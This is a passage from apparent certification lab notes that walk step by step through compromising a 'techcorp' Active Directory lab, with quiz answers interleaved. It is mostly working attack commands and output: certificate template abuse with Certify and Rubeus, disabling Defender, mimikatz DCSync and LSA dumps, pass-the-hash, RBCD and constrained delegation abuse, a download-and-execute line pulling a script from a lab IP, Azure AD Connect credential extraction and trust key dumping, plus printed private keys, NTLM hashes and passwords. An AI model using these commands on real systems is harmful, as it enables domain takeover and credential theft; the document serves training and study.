MIIEpAIBAAKCAQEAtj4lOMFgNRxVwclq6ch0vlStvUUSqUOKWtHYLz2WDOCwu3aKjyPmHdeiCzlO0/oyKx2sfYvOjXixCJLBzR+X3Fy/PYei+zgLf+QA2AYIdX3zoP/bswK1ukncwH8tUEpC715Qiz2ze4FmnBqHq5/1eA3K8ZVKlIFHf6uEoVpFi61eJzyBq731vJ6IsPvimPZTfEQWsdb8/tdzuehqsZc/4d8Csg5ej3PbasWiYnXd+647IamcTKO8+bNnRgkKmP8NqTbtvcTxS2aiF5KBRgWDT3mu9WOxM+uTSOYcBGLq6xeF4VcPsDxRfJcxGWhCaUtuDy3VGHxAIf5Ar04V4auK3QIDAQABAoIBAQC1IK796bQlFTRmljmcgY8GXEMRikUx1d78xPOIgD1SLz94EilEevmLT3XOkfa22ERkdemqHfn8waeyTaowpOXaLpQkI1rpNJq5UXNFQTnHDJfHvIQvNtJHhIHTEJOI6UX9gk+rFHf+mG3TWMre2OyvlYXO9gJZ9uOJEH+RnpbgapD+9riy/254adEFKxwiNuzcCK0Y3vXrt2Gmx4pDDATxSOvF8zeU7Gp5LdYcIaAkfQoiqoztGn3pTa3QJNpIfQCEEBqLkKNfm22Kl/ZyRPDOgtxJUM/ov3wv9dfyPRYbcNYJB8dRmiD3IEUXNyrvsog00LQLx9wPCfVC48I0REhBAoGBAOKqLyA7V6WcGPcDw151in8QObNPE3e+Q1wclWJO5TaWS001uhLdsURNVpurJwP5NvYBnmNP3Wenf1tWiqHWnKUDfKbsUihcAWQ9RxHM0/MrcdVqmrifDlogYjpAo1gQlsX9tJuzndRyfrmatec47GxbGS1n6lJvuvBX1IYfgBrHAoGBAM3ULcxt2jO8ULWmccxW6TlGqnRbvHt2mzVdplmG5E/ciFapS5CFKOeVkm6/5IebmVvDtkSnWXAoVwuA/xdl6qSCMiN+liE5GZqFEMLBFoLLujVuLy8QbufaBzcQ8ysf5jz9PKSPIffo0z8fIMWPtoKGA8RxArYUdrxjc0DOyKk7AoGBAKFpa/HaEIpg5O5TAbesoJnnpg9oyoZFOZbIzCCb6mK7GJi9H+r7cJchNAHbGgecW2VItdAnOZXtE6aptEOXnylrmEMOm1seWedWM9wbLvxF/eRq7A95RTEtSoYNLcUy2wvXpdwTRtvZRSFLaSplwQdQwFczXwyhgFBTW4a/u+xVAoGAHB/g/i0Igsc5lAihRhWeGqhwRCQA1jH3tUwNnfATpGHy8zyAyceYNkS21JE97dWyF9rfPfRMAUpR0o2WzaCsdjwgE7+JThLaT8Xc62+s3sRttj1PDzREo0Okdr7HK15ZfH3x2l6AerqCmv5q4PPpMV6UhzQV9cFIFCfWqMVYn98CgYBqWg5llKbjA1X517N/gyaGnN/2N1akR9MGoyemqAcZuGxVLaKU94AmrODVlJfIwjUN4Y5RENN/qoRDuLEhMSl+zxk4gocECNxrOQ6xQprn7IW4ING4XSo764jZt8ryBn69QGqynJ97f64IZQmJa4TRpo95uYcK4LqeRPlR3VkxkA==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
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
-----END CERTIFICATE-----
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/e13f7f73-e087-4df2-a168-ecdb42a0420a)


4. Change the RSA into a PFX and Request a TGT with the pfx
> Paste the Private key in a file named : *cert.pem*
```powershell
# SecretPass@123
PS> C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\dump\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\dump\DA.pfx

# Rubeus
# Request DA TGT and inject it
PS> C:\AD\Tools\Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\dump\DA.pfx /password:SecretPass@123 /nowrap /ptt

# exec commands on it
PS> winrs -r:us-dc whoami
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/12a86f80-310f-4e77-b1f9-ffc74f44fa9c)


5. Similarly, we can get Enterprise Admin privileges!
```powershell
PS> C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator

# cat cert.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA05SleH7iRXmFg/E+lh85dzC1DYaYEyZmge0WLdVNxMg/SCRkSiHWf7GGc3cHRoA3wTrXxdwe1capGAPkLA9/ACGcteJoo+e/IgRcWTZwmqID/LAGe/oO/hTie1d+aYbtmZzzTzv0PeqAjV/cmXsijh+UKDq8rIfLBizgzp7LSR4jE7tsPR7LcQ8te5XlPJMhuDwjD/QEdntTUZ45FA0oR+P4O+etOGZskNoYRrg1Qn8nCs27PaRT8pqzO/wt8hAUMsuBgtrmuGWge754YXFeWuLmZJdQKl84hqYWvHTGM9RjnYvd/okXIygtCscq9X4NOfLi7/2YO1PucT6KsR0D7QIDAQABAoIBAQCyJa2xqDxCvRBTSPQmmMHc/rDjY5l2PlX/Pa34B2rErsrBpoqe9KDTwZjwbZ89mEXZt/7oBPAdlXjY1KXxB1cquCJn7uumXkHLlZpgL3teZ94ti9TZ3HF1NAaCTegNWGOEfOdMprF+1I1K/BUVUd2Fh0dLHDGyn1+tomni70dBFsp33FnFilJ6nQ1PTYxHM2fbD4otcCYFPeVmp+t/RRfmbx77WFD/Aji2XpY7ByR1CHK1bNZQd7wYFgqOAe0jNcwKMft1VDIkZU5bqQ1YKrmdgM3NKthgW6ndYW32BdrzhUUDT6dBvT2mBKfjFGd4ZK28VwZgLK2q8X7fe+14EwPNAoGBANS/XFqUsd1lvAHahzpF9BOUiP7nfzFj2bWN8pkwvWMIe9eB/roDiY5j/pXiL5gMKXwNh0CG1ur9bUHzPJeu8nahMyF/EzrInWeRmQdmBNcMQhZM9Kbnpy+U5glOkrtexiAjGgG16lid+I928eZl8EXiJ6b9JdwOdmDBNjzGw9mnAoGBAP6YjkCML4+3/xC4PFytPRnryj010hJlqS4RB2S2i2JqKYhjguTDTl+tjLVbYh15OpST3R4v2HZ5B6EiKnmqP0SFwEPiqDlzUBbgXDB+wca6yn7P827hBlhMih1YMMjvJ7/SegOBx0CqKz27MP0JtvARAkaglotuny8R1E/racBLAoGBAIDXq4zIBLf6htPwjnkCKIE7MYR+mo9E03KaltOjqu6xEp8/gQ8SWVo8wM/w/bXtl6ojX0f64WnLNUH9lzKdpwWlNpwQo4q0OG+iw7SxWjkKmXN8A6aZIK02VeJJDaAgE4ke+P8UNuqYMRJhjLpl/g+0mSMOqMEOmS6blMdV8QJ9AoGAOWyzeT+lYqc/sse7ZbP1eilC3neLQHcJp8hTgJXj7ni/kXHQjkS3IsGEYUuRX9B+NBD96Ncl3eMCo4ePSQ3rY0s/yJARHZQy1lYYtR+CGY78KYpCABplUflBlcjUiB3ZO10ABFZ7WMyJIE1eiVRtnMxZVRDXo+95nCZLWxNgMO0CgYAdgA0UurrUHcY2sp/XJie/wdPekTJyFqXPuA+fShRuV+m7OwCoBR0PT9h/61Ps1DYgG7FMfHfvUWdJ0T24wNORBn4kkNVCqCXxzKpqHjeer6y+yTbejn8zCPulv8r2yCUMHMkJ91c2Yw9QXCvURu7FExk9mjjkQ6WXEYo7ZqeTDA==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
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
-----END CERTIFICATE-----
```

6. Change the RSA into a PFX and Request a TGT with the pfx
> Paste the Private key in a file named : *cert2.pem*
```powershell
# SecretPass@123
PS> C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\dump\cert2.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\EA.pfx

# Rubeus
# Request DA TGT and inject it
PS> C:\AD\Tools\Rubeus.exe asktgt /user:techcorp.local\Administrator /dc:techcorp-dc.techcorp.local /certificate:C:\AD\Tools\EA.pfx /password:SecretPass@123 /nowrap /ptt

# exec commands on it
# letssss access the forest root DC!
PS> winrs -r:techcorp-dc cmd
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/9970d67b-2d31-4728-b7c6-4fe078aa052f)



## **Dumping hashes**
<hr>

+ After connecting to techcorp-dc we can use mimikatz to dump all the hashes
```powershell
# connect to techcorp-dc
winrs -r:techcorp-dc cmd

# disable defender
PS> Set-MpPreference -DisableRealtimeMonitoring $true

# exit
PS> exit

# transfer mimi exe
PS> echo F | xcopy C:\AD\Tools\mimikatz.exe \\techcorp-dc\C$\Windows\Tasks\mimikatz.exe /Y

# enter the session again
winrs -r:techcorp-dc cmd

# execute mimi
PS> C:\Windows\Tasks\mimikatz.exe
mimikatz > privilege::debug
mimikatz > lsadump::dcsync /domain:techcorp.local /all /csv
mimikatz > lsadump::lsa /patch
```

| RID  | Username          | Hash                             |
| ---- | ----------------- | -------------------------------- |
| 502  | krbtgt            | 7735b8be1edda5deea6bfbacb7f2c3e7 |
| 1138 | privuser          | 6f179c10849d6a997cbe8a618868c108 |
| 1140 | testuser          | e774a7974dc0de4c0019c28e4c55f8c8 |
| 1139 | EMPTEST$          | 653af537f77a28855ab9160dfe673b9f |
| 500  | Administrator     | bc4cf9b751d196c4b6e1a2ba923ef33f |
| 1137 | BASTION$          | 052fd8c6017ae73d483552e538b19a59 |
| 1103 | US$               | eb0a409bc3fdf29b5dd6de11c57cba32 |
| 1104 | MSOL_16fb75d0227d | c1db8cdcb7a89f56dd00b77e384c2c9c |
| 1136 | USVENDOR$         | f0f9b6844c88501597d8c44ba566b1aa |
| 1000 | TECHCORP-DC$      | bf873f681eac2a97ec7e625c47dbb9db | 

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/00555d80-e969-4287-8087-13936c1de07b)



#### 29.What is the default RID used by Mimikatz (and other tools) for Golden ticket
```powershell
PS> # 500 >> administrator
```

#### 30. To be able to use WMI for Silver Ticket, we need to have TGS for two SPNs. One is HOST, which is the other one?
```powershell
PS> # RPCSS
```

#### 31. Name of the attack/technique that we can run against a domain controller if we have Replication rights
```powershell
PS> # dcsync
```

#### 32. Name of the template that we found to be vulnerable
```powershell
PS> # ForAdminsofPrivilegedAccessWorkstations
```

#### 33. The value of the attribute msPKI-Certificates-Name-Flag that allows to supply SubjectName in request
```powershell
PS> # Enrollee_Supplies_Subject
```

#### 34. Name of the user who has enrollment rights in ForAdminsofPrivilegedAccessWorkstations
```powershell
PS> # pawadmin
```

#### 35. Name of the high privilege user that is compromised by abusing printer bug to escalate from us.techcorp.local to techcorp.local
```powershell
PS> # techcorp-dc
```

<h1 style='color:lightblue'> 07 - US-HELPDESK.US.TECHCORP.LOCAL </h1>

## **RBCD Abuse**
<hr>

+ After dumping hashes from *US-MGMT* we obtained the ntlm hash for *mgmtadmin*
+ On the BloodHound Report we can use RBCD abuse to access *US-HELPDESK*

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/8bbfca01-7728-4424-a0b0-658e9418fae9)



```powershell
# sry no ss taken
# Spawn a session as mgmtadmin
PS> Invoke-Mimikatz -Command '"sekurlsa::pth /user:mgmtadmin /domain:US.TECHCORP.LOCAL /ntlm:e53153fc2dc8d4c5a5839e46220717e5 /run:powershell.exe"'

# Enumerate if we have Write permissions over any object
# PowerView
PS> Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'mgmtadmin'}

# Configure RBCD on us-helpdesk for student machines
# AD Module
PS> $comps = 'student131$'
PS> Set-ADComputer -Identity us-helpdesk -PrincipalsAllowedToDelegateToAccount $comps

# We we can dump the AES Keys of the Students
# SafetyKatz Binary
PS> SafetyKatz.exe -Command "sekurlsa::ekeys" "exit"

# Use the AES/RC4 key of studentx$ with Rubeus and access us-helpdesk as ANY user we want
PS> Rubeus.exe s4u /user:student131$ /rc4:36a67d9bf1625df605999c8f79036c54 /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt

# Now we can connect to the session
PS> winrs -r:us-helpdesk cmd.exe

# PSSESSION COnnect
PS> $sess = New-PSSession -Computername us-helpdesk

# run mimikatz
PS> Invoke-Command -Session $sess -FilePath "C:\AD\Tools\Invoke-Mimi.ps1"
PS> Invoke-Command -Session $sess -FilePath "C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1"
PS> Enter-PSSession -Session $sess
PS [us-helpdesk]: PS> Invoke-Mimi -Command '"sekurlsa::ekeys"'

# ntml of us-helpdesk$
# rc4 :: 76c3848cc2e34ef0a8b5751f7e886b8e 
# aes256 :: 9ff8482457429da3c58f466671a80765f175b14f22ef2d2ee0e12f7db3675e39 

# found a new user
# username :: helpdeskadmin
# rc4 :: 94b4a7961bb45377f6e7951b0d8630be 
# aes256 :: f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534 
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/c37c4870-1a38-4a68-95b9-ff0c342589fe)

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/0b2a8cef-2877-4a81-9d24-cfef068e191b)


#### 22. Name of the user that has Write/GenericWrite permissions over the us-helpdesk computer object
```powershell
PS> # mgmtadmin
```

#### 23. Name of the user that has Write/GenericWrite permissions over the us-helpdesk computer object
```powershell
PS> # 32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f
```

#### 24. Name of the user that we impersonate to access us-helpdesk
```powershell
PS> # administrator
```

#### 25. SPN of the service that is used to access us-helpdesk
```powershell
PS> # http/us-helpdesk
```

#### 26. Name of the user whose credentials are compromised from us-helpdesk
```powershell
PS> # helpdeskadmin
```

#### 27. AES256 keys for the helpdeskadmin user
```powershell
PS> # f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534
```


<h1 style='color:lightblue'> 08 - US-ADCONNECT.US.TECHCORP.LOCAL </h1>

## **Local Admin Access**
<hr>

1. *helpdeskadmin* has local admin access to *US-ADCONNECT*. We can spawn a session *helpdeskadmin* and use *New-PSSession* to connect with it.
```powershell
# spawn a session as helpdeskadmin
PS> Invoke-Mimi -Command '"sekurlsa::pth /user:helpdeskadmin /domain:US.TECHCORP.LOCAL /ntlm:94b4a7961bb45377f6e7951b0d8630be /run:powershell.exe"'

# check for local admin access
PS> . .\Find-PSRemotingLocalAdminAccess.ps1
PS> Find-PSRemotingLocalAdminAccess -Verbose

# enter pssession
PS> $sess = New-PSSession -Computername US-ADConnect
PS> Enter-PSSession -Session $sess
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/95ddc657-b437-43b0-aba6-8e09362b5eab)



2. Load mimikatz into the session and dump the creds
```powershell
# run mimikatz
PS> exit
PS> Invoke-Command -Session $sess -FilePath "C:\AD\Tools\Invoke-Mimi.ps1"
PS> Enter-PSSession -Session $sess
PS [US-ADConnect]: PS> Invoke-Mimi -Command '"sekurlsa::ekeys"'

# ntml of US-ADConnect$
# rc4 :: 093f64d9208f2b546a3b487388b2b34a 
# ntlm :: 0e29176c7aab71a2dd363880733ccd8cb9d35d9a69441cb55943c7358d5a69b0 

# found a new user
# username :: adconnect
# rc4 :: 4e150424ccf419d83ce3a8ad1db7b94a 
# aes256 :: 57d59f785ef201207412119d79b584aaad6da5d32a3e2bb12932c52daefe6ae9 
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/3ccaab42-6209-4945-aae1-d5711d3c8735)




## **AZure AD**
<hr>

+ *adconnect* user has local admin access to *US-ADConnect*

1. Load *Powerview.ps1* into the session and enumerate the PHS account and server where AD Connect is installed
```powershell
# ps session using adconect
PS> Invoke-Mimi -Command '"sekurlsa::pth /user:adconnect /domain:US.TECHCORP.LOCAL /ntlm:4e150424ccf419d83ce3a8ad1db7b94a /run:powershell.exe"'

# connect to us-adconnect
PS> winrs -r:us-adconnect cmd

# load powerview
PS> . .\PowerView.ps1
PS> Get-DomainUser -Identity "MSOL_*" -Domain techcorp.local
# name :: MSOL_16fb75d0227d
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/efbe9bc1-fed2-47a6-88b0-db79c04db5fd)


2. We can use adconnect to dump the creds
```powershell
# transfer adconnect and execute adconnect
PS> iex (New-Object Net.WebClient).DownloadString('http://192.168.100.131/adconnect.ps1')
PS> adconnect

# 70&n1{p!Mb7K.C)/USO.a{@m*%.+^230@KAc[+sr}iF>Xv{1!{=/}}3B.T8IW-{)^Wj^zbyOc=Ahi]n=S7K$wAr;sOlb7IFh}!%J.o0}?zQ8]fp&.5w+!!IaRSD@qYf
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/05a9932c-5dc1-4f4a-b195-de539a0ab276)



#### 28. Other then us-helpdesk, helpdeskadmin has administrative privileges on which other machine
```powershell
PS> # US-ADConnect
```

#### 36. Name of the machine where Azure AD Connect is installed
```powershell
PS> US-ADConnect
```

#### 37. Name of the user whose credentials are compromised from us-adconnect
```powershell
PS> # MSOL_16fb75d0227d
```

#### 38. Which attach/technique can be executed against techcorp.local due to high privileges of MSOL_16fb75d0227d
```powershell
PS> # dcsync
```

<h1 style='color:lightblue'> 09 - TECHCORP.LOCAL </h1>

## **Azure Creds**
<hr>

+ With the help of azure creds we can perform an dc-sync attack on *techcorp.local*
```powershell
# connect to MSOL_16fb75d0227d
# 70&n1{p!Mb7K.C)/USO.a{@m*%.+^230@KAc[+sr}iF>Xv{1!{=/}}3B.T8IW-{)^Wj^zbyOc=Ahi]n=S7K$wAr;sOlb7IFh}!%J.o0}?zQ8]fp&.5w+!!IaRSD@qYf
PS> runas /user:techcorp.local\MSOL_16fb75d0227d /netonly cmd

# Run mimikatz on popup session
PS> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
PS> . .\Invoke-Mimi.ps1
PS> Invoke-Mimi -Command '"sekurlsa::ekeys"'
PS> Invoke-Mimi -Command '"lsadump::dcsync /user:techcorp\administrator /domain:techcorp.local"'
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/401eb1dc-a8a8-4da4-916b-525f7a1b7449)


![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/2123995c-0db7-44a3-9892-41fcab30518d)



## **Enumeration**
<hr>

+ Lets get a proper session and run bloodhound
```powershell
PS> Invoke-Mimi -Command '"sekurlsa::pth /user:administrator /domain:TECHCORP.LOCAL /ntlm:bc4cf9b751d196c4b6e1a2ba923ef33f /run:powershell.exe"'

# CONNECT TO TECHCORP-DC
PS> winrs -r:techcorp-dc cmd

# transfer sharphound ( new session - parallely )
PS> echo F | xcopy C:\AD\Tools\BloodHound-master\Collectors\SharpHound.exe \\techcorp-dc\C$\Windows\Tasks\SharpHound.exe /Y

# run sharphound
PS> .\SharpHound.exe -c All,LoggedOn

# transfer the file back
PS> echo F | xcopy C:\AD\Tools\BloodHound-master\Collectors\SharpHound.exe \\techcorp-dc\C$\Windows\Tasks\SharpHound.exe /Y
```

<h1 style='color:lightblue'> 10 - US-MSSQL.US.TECHCORP.LOCAL </h1>

## **Constrained Delegation Abuse**
<hr>

+ From *US-Jump* we extracted *appsvc* creds. *appsvc* has constrained delegation to *US-MSSQL*. We can verify this using the BloodHound Report
![[Pasted image 20230702000034.png]]

1. Using powerview we can confirm that there is constrained delegation
```powershell
# found a new user
# username :: appsvc
# password :: Us$rT0AccessDBwithImpersonation
# ntlm :: 1d49d390ac01d568f0ee9be82bb74d4c 
# aes256 :: b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335 

# pssession as appsvc
PS> Invoke-Mimi -Command '"sekurlsa::pth /user:appsvc /domain:US.TECHCORP.LOCAL /ntlm:1d49d390ac01d568f0ee9be82bb74d4c /run:powershell.exe"'

PS> Get-DomainUser -TrustedToAuth
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/6b24c35a-c0e9-4dca-8acd-1e7b2a5aa9cc)



2. Request a TGT for appsvc using its NTLM hash
```powershell
PS> .\Rubeus.exe s4u /user:appsvc /rc4:1d49d390ac01d568f0ee9be82bb74d4c /impersonateuser:Administrator /msdsspn:"CIFS/us-mssql.us.techcorp.local" /altservice:HTTP /domain:us.techcorp.local /ptt
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/c997f954-c823-4bee-9e95-c6b3bc23b65a)



3. Now we can logon to *US-MSSQL* 
```powershell
PS> winrs -r:us-mssql.us.techcorp.local cmd.exe
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/3ea6f878-ce94-4d07-a163-ce3422c78be0)



<h1 style='color:lightblue'> 11 - BASTION-DC.BASTION.LOCAL </h1>

## **Forest Trust Key - SID Abuse**
<hr>

1. We require the trust key of inter-forest trust
```powershell
PS> Invoke-Mimi -Command '"sekurlsa::pth /user:administrator /domain:TECHCORP.LOCAL /ntlm:bc4cf9b751d196c4b6e1a2ba923ef33f /run:powershell.exe"'

# enter the session again
PS> winrs -r:techcorp-dc cmd

# transfer and load powerview,invoke-mimi and rubeus ( transfer from 2nd terminal )
PS> echo F | xcopy C:\AD\Tools\PowerView.ps1 \\techcorp-dc\C$\Windows\Tasks\PowerView.ps1 /Y
PS> echo F | xcopy C:\AD\Tools\Invoke-Mimi.ps1 \\techcorp-dc\C$\Windows\Tasks\Invoke-Mimi.ps1 /Y
PS> echo F | xcopy C:\AD\Tools\Rubeus.exe \\techcorp-dc\C$\Windows\Tasks\Rubeus.exe /Y

# dump the trust key of inter-forest trust
PS> Invoke-Mimi -Command '"lsadump::trust /patch"'

# bastion
# sid :: S-1-5-21-2781415573-3701854478-2406986946
# sids :: S-1-5-21-284138346-1733301406-1958478260-519
# rc4 :: 052fd8c6017ae73d483552e538b19a59 
